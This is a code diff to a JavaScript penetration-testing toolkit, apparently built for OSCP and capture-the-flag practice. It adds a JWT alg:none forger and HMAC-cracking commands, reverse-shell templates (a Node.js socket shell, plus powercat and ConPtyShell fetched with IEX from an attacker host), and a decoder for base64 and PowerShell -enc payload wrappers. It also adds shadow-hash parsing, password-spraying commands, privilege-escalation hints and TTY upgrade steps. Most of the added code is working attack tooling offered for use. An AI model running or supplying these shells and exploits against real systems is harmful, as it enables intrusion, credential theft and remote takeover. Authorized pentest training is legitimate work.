@@ -147,6 +147,106 @@
     };
   };
 
+  // Pure-JS SHA-256 + HMAC-SHA256 so JWT HS256 signing works synchronously in browser (even on file://) and in Node.
+  var _SHA256_K = [
+    0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,
+    0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3, 0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,
+    0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,
+    0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,
+    0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13, 0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,
+    0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,
+    0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,
+    0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208, 0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2
+  ];
+  function _rotr(n, x) { return (x >>> n) | (x << (32 - n)); }
+  function sha256Bytes(msgBytes) {
+    var l = msgBytes.length, bitLenHi = Math.floor((l * 8) / 0x100000000), bitLenLo = (l * 8) >>> 0;
+    var padLen = ((l + 9 + 63) & ~63);
+    var m = new Uint8Array(padLen);
+    for (var i = 0; i < l; i++) m[i] = msgBytes[i];
+    m[l] = 0x80;
+    m[padLen - 8] = (bitLenHi >>> 24) & 0xff; m[padLen - 7] = (bitLenHi >>> 16) & 0xff;
+    m[padLen - 6] = (bitLenHi >>> 8) & 0xff;  m[padLen - 5] = bitLenHi & 0xff;
+    m[padLen - 4] = (bitLenLo >>> 24) & 0xff; m[padLen - 3] = (bitLenLo >>> 16) & 0xff;
+    m[padLen - 2] = (bitLenLo >>> 8) & 0xff;  m[padLen - 1] = bitLenLo & 0xff;
+    var H0 = 0x6a09e667, H1 = 0xbb67ae85, H2 = 0x3c6ef372, H3 = 0xa54ff53a;
+    var H4 = 0x510e527f, H5 = 0x9b05688c, H6 = 0x1f83d9ab, H7 = 0x5be0cd19;
+    var W32 = new Uint32Array(64);
+    for (var off = 0; off < padLen; off += 64) {
+      for (var t = 0; t < 16; t++) {
+        var j = off + t * 4;
+        W32[t] = ((m[j] << 24) | (m[j + 1] << 16) | (m[j + 2] << 8) | m[j + 3]) >>> 0;
+      }
+      for (var t2 = 16; t2 < 64; t2++) {
+        var s0 = _rotr(7, W32[t2 - 15]) ^ _rotr(18, W32[t2 - 15]) ^ (W32[t2 - 15] >>> 3);
+        var s1 = _rotr(17, W32[t2 - 2]) ^ _rotr(19, W32[t2 - 2]) ^ (W32[t2 - 2] >>> 10);
+        W32[t2] = (W32[t2 - 16] + s0 + W32[t2 - 7] + s1) >>> 0;
+      }
+      var a = H0, b = H1, c = H2, d = H3, e = H4, f = H5, g = H6, h = H7;
+      for (var r = 0; r < 64; r++) {
+        var S1 = _rotr(6, e) ^ _rotr(11, e) ^ _rotr(25, e);
+        var ch = (e & f) ^ ((~e) & g);
+        var temp1 = (h + S1 + ch + _SHA256_K[r] + W32[r]) >>> 0;
+        var S0 = _rotr(2, a) ^ _rotr(13, a) ^ _rotr(22, a);
+        var maj = (a & b) ^ (a & c) ^ (b & c);
+        var temp2 = (S0 + maj) >>> 0;
+        h = g; g = f; f = e; e = (d + temp1) >>> 0;
+        d = c; c = b; b = a; a = (temp1 + temp2) >>> 0;
+      }
+      H0 = (H0 + a) >>> 0; H1 = (H1 + b) >>> 0; H2 = (H2 + c) >>> 0; H3 = (H3 + d) >>> 0;
+      H4 = (H4 + e) >>> 0; H5 = (H5 + f) >>> 0; H6 = (H6 + g) >>> 0; H7 = (H7 + h) >>> 0;
+    }
+    var out = [];
+    [H0, H1, H2, H3, H4, H5, H6, H7].forEach(function (w) {
+      out.push((w >>> 24) & 0xff, (w >>> 16) & 0xff, (w >>> 8) & 0xff, w & 0xff);
+    });
+    return out;
+  }
+  function hmacSha256Bytes(keyStr, msgStr) {
+    var k = utf8Bytes(String(keyStr == null ? '' : keyStr));
+    if (k.length > 64) k = sha256Bytes(k);
+    var ipad = [], opad = [];
+    for (var i = 0; i < 64; i++) {
+      var kb = i < k.length ? k[i] : 0;
+      ipad.push(kb ^ 0x36);
+      opad.push(kb ^ 0x5c);
+    }
+    var inner = sha256Bytes(ipad.concat(utf8Bytes(String(msgStr == null ? '' : msgStr))));
+    return sha256Bytes(opad.concat(inner));
+  }
+  W.b64urlEncode = function (str) {
+    return bytesToB64(utf8Bytes(str)).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
+  };
+  W.hmacSha256B64Url = function (secret, signingInput) {
+    return bytesToB64(hmacSha256Bytes(secret, signingInput)).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
+  };
+  W.forgeJwtNone = function (headerOrPayload, payloadObj, algVariant) {
+    var h, p;
+    if (payloadObj === undefined) {
+      h = { alg: 'none', typ: 'JWT' };
+      p = Object.assign({}, headerOrPayload || {});
+    } else {
+      h = Object.assign({}, headerOrPayload || { typ: 'JWT' }, { alg: algVariant || 'none' });
+      p = Object.assign({}, payloadObj || {});
+    }
+    return W.b64urlEncode(JSON.stringify(h)) + '.' + W.b64urlEncode(JSON.stringify(p)) + '.';
+  };
+  W.signJwtHs256 = function (headerObj, payloadObj, secret) {
+    var h = Object.assign({}, headerObj || { typ: 'JWT' }, { alg: 'HS256' });
+    var p = Object.assign({}, payloadObj || {});
+    var signingInput = W.b64urlEncode(JSON.stringify(h)) + '.' + W.b64urlEncode(JSON.stringify(p));
+    var sig = W.hmacSha256B64Url(secret == null ? '' : String(secret), signingInput);
+    return signingInput + '.' + sig;
+  };
+  W.jwtAttackCmds = function (token) {
+    var tok = String(token || '<JWT>').trim();
+    return [
+      { label: 'Crack HMAC Secret with Hashcat (Mode 16500)', locus: 'kali$', cmd: "echo '" + tok.replace(/'/g, "'\\''") + "' > jwt.txt && hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt" },
+      { label: 'Crack HMAC Secret with John the Ripper', locus: 'kali$', cmd: "echo '" + tok.replace(/'/g, "'\\''") + "' > jwt.txt && john --format=HMAC-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt jwt.txt" },
+      { label: 'Test All Known Exploits (alg:none, null sig, key confusion) via jwt_tool', locus: 'kali$', cmd: 'jwt_tool ' + tok + ' -M at' },
+    ];
+  };
+
   // A Linux one-liner that decodes and runs a base64 payload. OffSec teaches base64-wrapping a reverse
   // shell so a tricky character set (quotes, &, redirects) survives being pasted into a target field.
   W.linuxB64Runner = function (cmd, shellBin) {
@@ -267,16 +367,48 @@
 
   // The registry. applies() gates the AUTO search; it reads the latin1 view of the bytes.
   function _a(bytes) { return u8Ascii(bytes); }
+  function utf16leDecodeBytes(raw) {
+    if (!raw || raw.length < 4 || raw.length % 2 !== 0) return null;
+    var oddZeros = 0, pairs = raw.length / 2, out = [];
+    for (var i = 0; i < raw.length; i += 2) {
+      if (raw[i + 1] === 0 && (raw[i] === 9 || raw[i] === 10 || raw[i] === 13 || (raw[i] >= 32 && raw[i] <= 126))) oddZeros++;
+      out.push(raw[i]);
+    }
+    if (oddZeros / pairs < 0.75) return null;
+    return Uint8Array.from(out);
+  }
+
   var CODECS = [
     { id: 'base64', label: 'Base64', note: 'The everyday encoding. The OSCP base64-then-decode trick lives here.', stack: true,
       encode: function (t) { return W.b64(t); }, decode: function (b) { return b64toBytes(_a(b)); },
-      applies: function (b) { var s = _a(b).replace(/\s+/g, ''); return /^[A-Za-z0-9+/]+={0,2}$/.test(s) && s.length >= 8 && s.length % 4 === 0 && /[0-9+/=]/.test(s); } },
+      applies: function (b) {
+        var s = _a(b).replace(/\s+/g, '');
+        if (!/^[A-Za-z0-9+/]+={0,2}$/.test(s) || s.length < 4 || s.length % 4 !== 0) return false;
+        if (/^[a-zA-Z]+$/.test(s) && !/(?:[A-Z].*[a-z].*[A-Z]|[a-z].*[A-Z])/.test(s)) return false;
+        var dec = b64toBytes(s);
+        if (!dec || !dec.length) return false;
+        if (dec.length > 2 && ((dec[0] === 0x1f && dec[1] === 0x8b) || (dec[0] === 0x78 && [0x01, 0x5e, 0x9c, 0xda].indexOf(dec[1]) >= 0))) return true;
+        return printableRatio(dec) >= 0.85;
+      } },
+    { id: 'psenc', label: 'PowerShell -enc (UTF-16LE Base64)', note: 'Windows PowerShell -EncodedCommand format (UTF-16LE bytes then Base64).', stack: true,
+      encode: function (t) { return W.psEnc(t); },
+      decode: function (b) { return utf16leDecodeBytes(b64toBytes(_a(b))); },
+      applies: function (b) {
+        var s = _a(b).replace(/\s+/g, '');
+        if (!/^[A-Za-z0-9+/]+={0,2}$/.test(s) || s.length < 8 || s.length % 4 !== 0) return false;
+        return !!utf16leDecodeBytes(b64toBytes(s));
+      } },
     { id: 'base64url', label: 'Base64 URL', note: 'URL-safe base64 (-_ instead of +/, no padding). JWT segments use this.', stack: true,
       encode: b64urlEnc, decode: function (b) { return b64toBytes(_a(b)); },
-      applies: function (b) { var s = _a(b).replace(/\s+/g, ''); return /^[A-Za-z0-9_-]+$/.test(s) && s.length >= 8 && /[-_]/.test(s); } },
+      applies: function (b) {
+        var s = _a(b).replace(/\s+/g, '');
+        if (!/^[A-Za-z0-9_-]+$/.test(s) || s.length < 4 || !/[-_]/.test(s)) return false;
+        var dec = b64toBytes(s);
+        return !!(dec && dec.length && printableRatio(dec) >= 0.85);
+      } },
     { id: 'hex', label: 'Hex', note: 'Raw bytes as hexadecimal.', stack: true,
       encode: function (t) { return W.hexEnc(t); }, decode: function (b) { return hexToBytes(_a(b)); },
-      applies: function (b) { var s = _a(b).replace(/\s+/g, ''); return /^[0-9a-fA-F]+$/.test(s) && s.length >= 8 && s.length % 2 === 0; } },
+      applies: function (b) { var s = _a(b).replace(/\s+/g, ''); return /^[0-9a-fA-F]+$/.test(s) && s.length >= 4 && s.length % 2 === 0; } },
     { id: 'url', label: 'URL (percent)', note: 'Percent-encode the characters a URL would choke on.', stack: true,
       encode: function (t) { return W.urlEnc(t); }, decode: function (b) { try { return toU8(decodeURIComponent(_a(b).replace(/\+/g, ' '))); } catch (e) { return null; } },
       applies: function (b) { return /%[0-9a-fA-F]{2}/.test(_a(b)); } },
@@ -317,34 +449,58 @@
   W.CODECS = CODECS;
   W.codecList = function () { return CODECS.map(function (c) { return { id: c.id, label: c.label, note: c.note, enc: !!c.encode, dec: !!c.decode }; }); };
 
-  // How "decoded" a byte string looks: printable ratio + structure/marker bonuses. Used to pick the best
-  // node in the recursive search. A flag, JSON, a JWT header, a URL, or real words all score high.
-  var _WORDS = /\b(the|and|for|you|are|with|this|that|from|have|not|true|false|null|password|passwd|admin|administrator|user|username|login|flag|secret|key|token|bearer|http|https|root|pass|welcome|error|success|cookie|session|email)\b/gi;
+  // Unwrap common shell wrappers (e.g. "echo <B64> | base64 -d | bash" or "powershell ... -enc <B64>")
+  // so pasting a wrapped command into Decode still peels the inner payload cleanly.
+  W.unwrapShellWrapper = function (raw) {
+    var s = String(raw == null ? '' : raw).trim();
+    var mEcho = s.match(/^(?:echo|\{echo,)[\s,]+['"]?([A-Za-z0-9+/=_-]{4,})['"]?\}?\s*\|\s*base64/i);
+    if (mEcho) return { unwrapped: true, label: 'Linux base64 wrapper', payload: mEcho[1] };
+    var mPs = s.match(/powershell(?:\.exe)?\b[^\r\n]*?\s-(?:e|en|enc|enco|encoded|encodedcommand)\s+['"]?([A-Za-z0-9+/=]{8,})['"]?/i);
+    if (mPs) return { unwrapped: true, label: 'PowerShell -enc wrapper', payload: mPs[1] };
+    return { unwrapped: false, label: '', payload: s };
+  };
+
+  // How "decoded" a byte string looks: printable ratio + structure/marker bonuses, minus penalties for
+  // strings that still look like raw encodings (hex, base64, percent-encoded, binary, decimal).
+  var _WORDS = /\b(the|and|for|you|are|with|this|that|from|have|not|true|false|null|password|passwd|admin|administrator|user|username|login|flag|secret|key|token|bearer|http|https|root|pass|welcome|error|success|cookie|session|email|bash|sh|whoami|id|cat|curl|wget|nc|python|python3|powershell|iex|select|union|where|from|table|exec|system|cmd)\b/gi;
   function scoreBytes(bytes) {
     if (!bytes.length) return -1;
-    var pr = printableRatio(bytes), txt = u8Text(bytes), s = pr * 100;
+    var pr = printableRatio(bytes), txt = u8Text(bytes), trimmed = txt.trim(), s = pr * 100;
     if (/\b(flag|HTB|THM|FLAG|picoCTF|CTF)\{[^}]*\}/i.test(txt)) s += 150;
     if (/^\s*[{\[][\s\S]*[}\]]\s*$/.test(txt)) { try { JSON.parse(txt); s += 60; } catch (e) { s += 8; } }
     if (/"alg"\s*:/.test(txt) || /"typ"\s*:\s*"JWT"/i.test(txt)) s += 40;
     if (/https?:\/\/\S+/i.test(txt)) s += 25;
-    var w = (txt.match(_WORDS) || []).length; s += Math.min(w, 8) * 9;
+    if (/\/(?:etc|bin|usr|var|tmp|dev|home|root)\/\S+/i.test(txt)) s += 35;
+    if (/\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b/.test(txt)) s += 25;
+    var w = (txt.match(_WORDS) || []).length; s += Math.min(w, 8) * 10;
     if (/�/.test(txt)) s -= 25;
-    if (pr > 0.9 && /\s/.test(txt)) s += 8;
+    for (var i = 0; i < bytes.length; i++) { if (bytes[i] === 0) { s -= 30; break; } }
+    if (pr > 0.9 && /\s/.test(txt)) s += 10;
+    // Penalize strings that still look like an unpeeled encoding layer
+    if (/^[0-9a-fA-F]{4,}$/.test(trimmed) && trimmed.length % 2 === 0) s -= 28;
+    else if (/%[0-9a-fA-F]{2}/.test(trimmed)) s -= 24;
+    else if (/^[01\s]{16,}$/.test(trimmed)) s -= 30;
+    else if (/^\d{1,3}([\s,]+\d{1,3}){2,}$/.test(trimmed)) s -= 26;
+    else if (/^[A-Za-z0-9+/]+={1,2}$/.test(trimmed) && trimmed.length % 4 === 0) s -= 24;
+    else if (/^[A-Za-z0-9+/]{8,}$/.test(trimmed) && trimmed.length % 4 === 0 && /[0-9+/]/.test(trimmed) && !/\s/.test(trimmed)) s -= 18;
     return s;
   }
   W.scoreText = function (x) { return scoreBytes(toU8(x)); };
 
   // Recursive "decode to completion": BFS over applicable decodes (applies() keeps branching tight),
   // bounded by depth + a node budget, deduped, scoring every node and returning the best one with its
-  // full chain. Async because gzip/zlib go through the native streams. Honest: if nothing beats the raw
-  // input it says so, and it never claims the result is the "real" plaintext, only the most-decoded one.
+  // full chain and step-by-step intermediate values.
   W.smartDecode = function (input, opts) {
     opts = opts || {};
     var maxDepth = opts.maxDepth || 8, budget = opts.budget || 300;
-    var root = toU8(input), rootScore = scoreBytes(root);
-    var best = { bytes: root, score: rootScore, chain: [] };
+    var rawStr = (typeof input === 'string') ? input : u8Text(toU8(input));
+    var un = W.unwrapShellWrapper(rawStr);
+    var initChain = un.unwrapped ? ['wrapper'] : [];
+    var initSteps = un.unwrapped ? [{ id: 'wrapper', codec: un.label, label: un.label, text: un.payload }] : [];
+    var root = toU8(un.payload), rootScore = scoreBytes(root);
+    var best = { bytes: root, score: rootScore, chain: initChain, steps: initSteps };
     var seen = {}; seen[u8Ascii(root)] = 1;
-    var queue = [{ bytes: root, chain: [], depth: 0 }], nodes = 0;
+    var queue = [{ bytes: root, chain: initChain, steps: initSteps, depth: 0 }], nodes = 0;
     function step() {
       while (queue.length && nodes < budget) {
         var node = queue.shift(); nodes++;
@@ -352,7 +508,6 @@
         var applicable = [];
         for (ci = 0; ci < AUTO.length; ci++) { try { if (AUTO[ci].applies(node.bytes)) applicable.push(AUTO[ci]); } catch (e) {} }
         if (!applicable.length) continue;
-        // resolve all applicable decodes for this node (some async), then enqueue the new ones
         return Promise.all(applicable.map(function (codec) {
           var r; try { r = codec.decode(node.bytes); } catch (e) { r = null; }
           return Promise.resolve(r).then(function (res) { return { codec: codec, res: res }; }, function () { return { codec: codec, res: null }; });
@@ -360,9 +515,13 @@
           results.forEach(function (rc) {
             var res = rc.res; if (!res || !res.length) return;
             var key = u8Ascii(res); if (seen[key]) return; seen[key] = 1;
-            var sc = scoreBytes(res), chain = node.chain.concat([rc.codec.id]);
-            if (sc > best.score) best = { bytes: res, score: sc, chain: chain };
-            if (node.depth + 1 < maxDepth) queue.push({ bytes: res, chain: chain, depth: node.depth + 1 });
+            var pr = printableRatio(res);
+            var txt = u8Text(res);
+            var sc = scoreBytes(res) + (pr >= 0.95 && txt.indexOf('\uFFFD') < 0 ? (node.depth + 1) * 8 : 0);
+            var chain = node.chain.concat([rc.codec.id]);
+            var steps = node.steps.concat([{ id: rc.codec.id, codec: rc.codec.label, label: rc.codec.label, text: txt }]);
+            if (sc > best.score) best = { bytes: res, score: sc, chain: chain, steps: steps };
+            if (node.depth + 1 < maxDepth) queue.push({ bytes: res, chain: chain, steps: steps, depth: node.depth + 1 });
           });
           return step();
         });
@@ -370,21 +529,36 @@
       return Promise.resolve();
     }
     return step().then(function () {
-      var improved = best.chain.length > 0 && best.score > rootScore + 5;
+      var realChain = best.chain.filter(function (id) { return id !== 'wrapper'; });
+      var improved = realChain.length > 0 && best.score > rootScore + 4 && printableRatio(best.bytes) >= 0.8;
       return {
-        input: (typeof input === 'string') ? input : u8Text(root),
+        input: rawStr,
         found: improved,
-        best: { text: u8Text(best.bytes), chain: best.chain.map(labelFor), chainIds: best.chain, printable: printableRatio(best.bytes), score: best.score },
-        rootScore: rootScore, nodes: nodes,
+        best: {
+          text: u8Text(best.bytes),
+          chain: best.chain.map(labelFor),
+          chainIds: best.chain,
+          steps: best.steps,
+          unwrapped: un.unwrapped,
+          wrapperLabel: un.label,
+          printable: printableRatio(best.bytes),
+          score: best.score
+        },
+        rootScore: rootScore,
+        nodes: nodes,
       };
     });
   };
-  function labelFor(id) { var c = codecById(id); return c ? c.label : id; }
+  function labelFor(id) {
+    if (id === 'wrapper') return 'Command Wrapper';
+    var c = codecById(id); return c ? c.label : id;
+  }
 
   // "Try every decoding at once": one layer, every codec that either applies or yields mostly-printable
   // output, sorted so the readable results float to the top. Async for the compression codecs.
   W.decodeAllOnce = function (input) {
-    var bytes = toU8(input), base = u8Text(bytes);
+    var un = W.unwrapShellWrapper(input);
+    var bytes = toU8(un.payload), base = u8Text(bytes);
     return Promise.all(CODECS.map(function (c) {
       if (!c.decode) return Promise.resolve(null);
       var r; try { r = c.decode(bytes); } catch (e) { r = null; }
@@ -394,7 +568,7 @@
         var pr = printableRatio(res), applies = false;
         try { applies = c.applies ? c.applies(bytes) : false; } catch (e) {}
         if (!applies && pr < 0.75) return null;
-        return { id: c.id, label: c.label, text: txt, printable: pr, applies: applies };
+        return { id: c.id, label: c.label + (un.unwrapped ? (' (after unwrapping ' + un.label + ')') : ''), text: txt, printable: pr, applies: applies };
       }, function () { return null; });
     })).then(function (list) {
       return list.filter(Boolean).sort(function (a, b) { return (b.applies - a.applies) || (b.printable - a.printable); });
@@ -502,6 +676,21 @@
       id: 'cmd-nc', name: 'Windows nc.exe', os: 'windows', enc: [],
       tpl: 'nc.exe {{lhost}} {{lport}} -e cmd.exe',
       note: 'Needs nc.exe staged on the target first (serve it from Kali, download it, then run). A plain cmd shell, no PowerShell.',
+    },
+    {
+      id: 'nodejs', name: 'Node.js', os: 'linux', enc: ['b64'],
+      tpl: 'node -e \'(function(){var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/sh",[]);var client=new net.Socket();client.connect({{lport}},"{{lhost}}",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();\'',
+      note: 'For Node.js / Express web apps or Electron containers where node is in PATH.',
+    },
+    {
+      id: 'powercat', name: 'PowerShell (powercat)', os: 'windows', enc: ['psenc'],
+      tpl: 'IEX(New-Object System.Net.WebClient).DownloadString("http://{{lhost}}:8000/powercat.ps1");powercat -c {{lhost}} -p {{lport}} -e cmd',
+      note: 'Serve powercat.ps1 on port 8000 (from /usr/share/powershell-empire/ or Kali). Very reliable when raw socket scripts get flagged.',
+    },
+    {
+      id: 'conpty', name: 'Windows ConPTY (Interactive)', os: 'windows', enc: ['psenc'],
+      tpl: 'IEX(IWR http://{{lhost}}:8000/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell {{lhost}} {{lport}}',
+      note: 'Upgrades a Windows reverse shell to a full interactive console with tab-completion and arrow keys. Catch with: stty raw -echo; (stty size; cat) | nc -lvnp {{lport}}',
     },
   ];
 
@@ -624,8 +813,21 @@
     if (rp) { s = rp[1].trim(); changes.push('Removed the capture-log prefix, kept the hash.'); }
 
     // a full secretsdump / pwdump line -> the NT hash (4th field), which is what -m 1000 wants
+    var username = '';
     var pd = s.match(PWDUMP_RE);
-    if (pd) { s = pd[2]; changes.push('Took the NT hash (4th field) from the secretsdump line.'); }
+    if (pd) {
+      username = s.split(':')[0] || '';
+      s = pd[2];
+      changes.push('Took the NT hash (4th field) from the secretsdump line.');
+    }
+
+    // a Linux /etc/shadow line or user:hash pair (not NetNTLMv1/v2 ::, not Oracle S:, not $krb5)
+    var sh = !pd && s.match(/^([a-zA-Z0-9_.\\$-]{2,48}):(\$[1256yabxyPHS]+\$[^\s:]+|[0-9a-fA-F]{32,128})(?::\d*:\d*:\d*:\d*:\d*:\d*:[^\s:]*)?$/);
+    if (sh && sh[1] !== 'S' && !/^[0-9a-fA-F]{32}$/.test(sh[1])) {
+      username = sh[1];
+      s = sh[2];
+      changes.push('Stripped the username prefix (' + username + ':) and trailing shadow fields.');
+    }
 
     if (/^\$NT\$/i.test(s)) { s = s.replace(/^\$NT\$/i, ''); changes.push('Removed the $NT$ prefix.'); }
 
@@ -635,7 +837,7 @@
       changes.push('Joined the Kerberos ticket into one line (removed the line wraps).');
     }
 
-    return { input: original, cleaned: s, changed: changes.length > 0, changes: changes };
+    return { input: original, cleaned: s, clean: s, changed: changes.length > 0, changes: changes, username: username };
   };
 
   // The hashcat crack command for a candidate (canonical rockyou path; the Loadout rewrite can retarget it).
@@ -673,7 +875,7 @@
     if (!entry) return 'nc -lvnp ' + lport;
     if (entry.id === 'ncat-ssl') return 'ncat --ssl -lvnp ' + lport;
     if (entry.id === 'socat') return 'socat file:`tty`,raw,echo=0 TCP-LISTEN:' + lport;
-    if (entry.id === 'ps-iex-download') return 'python3 -m http.server ' + lport + '    # serve shell.ps1 from here';
+    if (entry.id === 'ps-iex-download') return 'python3 -m http.server ' + lport;
     return 'nc -lvnp ' + lport;
   };
 
@@ -742,8 +944,8 @@
       case 'dirs': return 'gobuster dir -u http://' + tgt + '/ -w ' + path + (ext ? ' -x ' + ext : '') + ' -t 40';
       case 'files': return 'ffuf -u http://' + tgt + '/FUZZ -w ' + path + (ext ? ' -e ' + ext : '');
       case 'subdomains': return 'ffuf -u http://' + tgt + '/ -H "Host: FUZZ.' + tgt + '" -w ' + path + ' -fs 0';
-      case 'users': return '# feed as the user list, e.g.  nxc smb ' + tgt + ' -u ' + path + ' -p <password>';
-      case 'passwords': return '# feed as the password list, e.g.  hydra -l <user> -P ' + path + ' ' + tgt + ' http-post-form ...';
+      case 'users': return "nxc smb " + tgt + " -u " + path + " -p '' --continue-on-success";
+      case 'passwords': return "nxc smb " + tgt + " -u bob -p " + path + " --continue-on-success";
       case 'params': return 'ffuf -u "http://' + tgt + '/page?FUZZ=1" -w ' + path + ' -fs 0';
       case 'lfi': return 'ffuf -u "http://' + tgt + '/index.php?page=FUZZ" -w ' + path + ' -fr "could not"';
       case 'api': return 'ffuf -u http://' + tgt + '/api/FUZZ -w ' + path;
@@ -900,7 +1102,7 @@
     if (FACT_EXPLAIN[kind]) return FACT_EXPLAIN[kind];
     var keys = Object.keys(FACT_EXPLAIN);
     for (var i = 0; i < keys.length; i++) { if (keys[i].slice(-1) === ':' || keys[i].slice(-1) === '.') { if (kind.indexOf(keys[i]) === 0) return FACT_EXPLAIN[keys[i]]; } }
-    return { proves: 'OBOL minted a fact from this line.', caveat: 'Read it as a lead to weigh, not a guarantee. The coach ranks what it unlocks.' };
+    return { proves: 'OBOL minted a fact from this line.', caveat: 'Read it as a lead to weigh, not a guarantee. The Cockpit ranks what it unlocks.' };
   }
   W.explainKind = explainKind;
 
@@ -1073,6 +1275,14 @@
     sig('skew', /KRB_AP_ERR_SKEW|clock skew too great/i, 'warn', 'Kerberos clock skew', 'Your clock is too far from the DC for Kerberos.', 'Sync to the DC and retry (fix-clock-skew).'),
     sig('spnunknown', /KDC_ERR_S_PRINCIPAL_UNKNOWN|PRINCIPAL_UNKNOWN/i, 'warn', 'Kerberos principal unknown', 'The SPN or name is wrong, or you used an IP.', 'Use the exact FQDN or SPN, not an IP (kerberos-spn-fix).'),
     sig('os', /(Windows(?:\s+Server)?\s+\d{4}[^)\n]*?\b\d{4,5}\b)/i, 'info', null, 'The exact OS and build date the host.', 'Note the build for patch-level and kernel-LPE triage.'),
+    sig('localport', /(?:127\.0\.0\.1|\[::1\]):(\d{2,5})\b.*(?:LISTEN|LISTENING)/i, 'win', 'Internal localhost-only service listening', 'A service is bound to 127.0.0.1 and hidden from external scans.', 'Forward this port to Kali using the Pivot & Tunnel Builder (SSH -L or Chisel).'),
+    sig('internalnic', /\b(172\.(?:1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})\b/, 'win', 'Secondary internal network interface detected', 'This host is dual-homed or connected to an internal subnet.', 'Use the Pivot & Tunnel Builder (Ligolo-ng or Chisel SOCKS5) to route into the internal subnet.'),
+    sig('seimpersonate', /SeImpersonatePrivilege.*(?:Enabled|Disabled)|SeAssignPrimaryTokenPrivilege/i, 'win', 'Token impersonation privilege (SeImpersonate / SeAssignPrimaryToken)', 'Service accounts with this privilege can escalate directly to NT AUTHORITY\\SYSTEM.', 'Run GodPotato, PrintSpoofer, or JuicyPotatoNG to spawn a SYSTEM shell.'),
+    sig('sebackup', /SeBackupPrivilege|SeRestorePrivilege|BUILTIN\\Backup Operators/i, 'win', 'Backup / Restore privilege detected', 'Allows reading or writing any file on the filesystem, bypassing NTFS ACLs.', 'Copy SAM and SYSTEM registry hives (reg save HKLM\\SAM) or ntds.dit on a DC.'),
+    sig('dnsadmins', /DnsAdmins/i, 'win', 'Member of DnsAdmins group', 'Can load an arbitrary DLL into the Domain Controller DNS service running as SYSTEM.', 'Generate a reverse shell DLL in Msfvenom Builder and load it via dnscmd.exe /config /serverlevelplugindll.'),
+    sig('nopasswd', /NOPASSWD\s*:\s*([^\r\n]+)/i, 'win', 'Passwordless sudo rule (NOPASSWD)', 'This account can execute a command as root without knowing its own password.', 'Look up the permitted binary in the GTFOBins tab for an instant root escape.'),
+    sig('dockergrp', /\b(?:\d+\(docker\)|\bdocker\b.*groups=|\(lxd\)|\(lxc\)|\(disk\)|\(shadow\))/i, 'win', 'Privileged Linux group membership (docker / lxd / disk / shadow)', 'Group membership grants direct host filesystem or shadow hash access.', 'Mount the host root filesystem (/) inside a container to read /root/root.txt or /etc/shadow.'),
+    sig('alwaysinstall', /AlwaysInstallElevated\s+REG_DWORD\s+0x1/i, 'win', 'AlwaysInstallElevated is enabled (0x1)', 'Any low-privilege user can install an MSI package with NT AUTHORITY\\SYSTEM privileges.', 'Generate a reverse shell .msi in the Reverse Shell & Msfvenom tab and run msiexec /quiet /qn /i setup.msi.'),
   ];
   W.scanSignals = function (text) {
     text = String(text == null ? '' : text);
@@ -1082,6 +1292,1003 @@
       if (m && !seen[s.id]) { seen[s.id] = 1; out.push({ id: s.id, tone: s.tone, label: s.label || m[1] || m[0], meaning: s.meaning, next: s.next }); }
     }
     return out;
+  };
+
+  // ── TTY Stabilization, Msfvenom Stager Builder, and Webshells ───────────────────────────────
+  W.TTY_RECIPES = [
+    {
+      id: 'linux-python', label: '1. Linux Python3 Full PTY Upgrade (Standard)', title: 'Linux Python3 Full PTY Upgrade (Standard)', os: 'linux',
+      note: 'Upgrades a dumb reverse shell so Ctrl+C, arrow keys, tab-completion, su, and sudo work properly.',
+      steps: [
+        { locus: 'target$', note: '1. Spawn a PTY via Python', label: '1. Spawn a PTY via Python', cmd: 'python3 -c \'import pty;pty.spawn("/bin/bash")\' || python -c \'import pty;pty.spawn("/bin/bash")\'' },
+        { locus: 'target$', note: '2. Export terminal type, then press Ctrl+Z to background the shell', label: '2. Export terminal type (then press Ctrl+Z to background)', cmd: 'export TERM=xterm-256color' },
+        { locus: 'kali$',   note: '3. Pass raw keystrokes through Kali and foreground the shell', label: '3. Pass raw keystrokes through Kali and foreground the shell', cmd: 'stty raw -echo; fg' },
+        { locus: 'target$', note: '4. Match terminal dimensions so vim/less do not wrap badly', label: '4. Match terminal dimensions so vim/less do not wrap badly', cmd: 'stty rows 48 cols 160' },
+      ]
+    },
+    {
+      id: 'linux-script', label: '2. Linux /usr/bin/script PTY Fallback (No Python)', title: 'Linux /usr/bin/script PTY Fallback (No Python)', os: 'linux',
+      note: 'Use when python/python3 is not installed on the target Linux host.',
+      steps: [
+        { locus: 'target$', note: '1. Spawn a PTY with /usr/bin/script', label: '1. Spawn a PTY with /usr/bin/script', cmd: '/usr/bin/script -qc /bin/bash /dev/null' },
+        { locus: 'target$', note: '2. Fix PATH and TERM', label: '2. Fix PATH and TERM', cmd: 'export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; export TERM=xterm' },
+      ]
+    },
+    {
